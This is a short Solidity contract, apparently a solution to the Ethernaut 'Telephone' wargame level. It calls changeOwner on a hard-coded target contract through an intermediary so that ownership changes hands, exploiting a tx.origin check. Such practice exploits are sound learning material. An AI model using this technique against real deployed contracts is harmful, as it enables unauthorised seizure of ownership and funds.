// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone  {
  function changeOwner(address _owner) external;
}

contract Attaknaut {
    Telephone telephone = Telephone(0xF746c217e9C7637842202832C718B56858Bb3530);

    function changeOwner(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}
